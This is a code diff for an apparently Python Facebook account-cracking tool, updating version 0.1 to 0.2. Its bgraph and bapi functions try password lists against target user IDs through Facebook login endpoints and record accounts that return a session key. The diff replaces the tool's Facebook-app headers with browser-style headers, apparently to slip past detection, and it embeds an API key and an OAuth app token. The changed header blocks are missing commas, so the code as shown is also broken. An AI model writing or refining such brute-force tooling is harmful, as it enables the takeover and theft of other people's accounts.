@@ -10,7 +10,7 @@ targets,passwordlist,loopcracked = [],[],0
 name = "rahul"
 github = "https://github.com/blesseco/"
 facebook = "devrahul63"
-Version = "0.1"
+Version = "0.2"
 
 green = "\x1b[1;92m"
 red = "\x1b[1;91m"
@@ -98,15 +98,24 @@ def bgraph(userid,passwordlist,total_target):
                 'api_key': '882a8490361da98702bf97a021ddc14d',
                 'access_token': app}
             header = {
-                'x-fb-connection-bandwidth':str(random.randint(20000000.0, 30000000.0)), 
-                'x-fb-net-hni':str(random.randint(20000, 40000)), 
-                'x-fb-sim-hni':str(random.randint(20000, 40000)), 
-                'x-fb-connection-quality':'EXCELLENT', 
-                'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA', 
-                'content-type':'application/x-www-form-urlencoded', 
-                'x-fb-http-engine':'Liger',
+    'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+    'accept-language': 'en-US,en;q=0.9',
+    'cache-control': 'max-age=0',
+    'dpr': '3.75',
+    'sec-ch-prefers-color-scheme': 'light',
+    'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+    'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+    'sec-ch-ua-mobile': '?0',
+    'sec-ch-ua-model': '""',
+    'sec-ch-ua-platform': '"Linux"',
+    'sec-ch-ua-platform-version': '""',
+    'sec-fetch-dest': 'document',
+    'sec-fetch-mode': 'navigate',
+    'sec-fetch-site': 'none',
+    'sec-fetch-user': '?1',
+    'upgrade-insecure-requests': '1'
                 'user-agent':useragent}
-            response = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=header,allow_redirects=False,proxies=proxs)
+            response = requests.post("https://b-graph.facebook.com/auth/login",data=data,headers=header,allow_redirects=False)
             if 'session_key' in str(response.text):
                 if userid not in OK:
                     try:
@@ -164,14 +173,20 @@ def bapi(userid,username,passwordlist,total_target):
                 'generate_analytics_claim':'1',
                 'generate_machine_id':'1'}
             header = {
-                'x-fb-connection-bandwidth':str(random.randint(20000000.0, 30000000.0)), 
-                'x-fb-net-hni':str(random.randint(20000, 40000)), 
-                'x-fb-sim-hni':str(random.randint(20000, 40000)), 
-                'x-fb-connection-quality':'EXCELLENT', 
-                'Authorization': 'OAuth 350685531728|62f8ce9f74b12f84c123cc23437a4a32',                
-                'x-fb-connection-type':'cell.CTRadioAccessTechnologyHSDPA', 
-                'content-type':'application/x-www-form-urlencoded', 
-                'x-fb-http-engine':'Liger',
+'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
+'accept-language': 'en-US,en;q=0.9',
+'cache-control': 'max-age=0',
+'dpr': '3.75',
+'sec-ch-prefers-color-scheme': 'light',
+'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
+'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
+'sec-ch-ua-mobile': '?0',
+'sec-ch-ua-model': '""',
+'sec-ch-ua-platform': '"Linux"',
+'sec-ch-ua-platform-version': '""',
+'sec-fetch-dest': 'document',
+'sec-fetch-mode': 'navigate',
+'sec-fetch-site': 'none',
                 'user-agent':useragent}
             response = requests.post("https://b-api.facebook.com/method/auth",data=data,headers=header,allow_redirects=False)
             if 'session_key' in str(response.text):
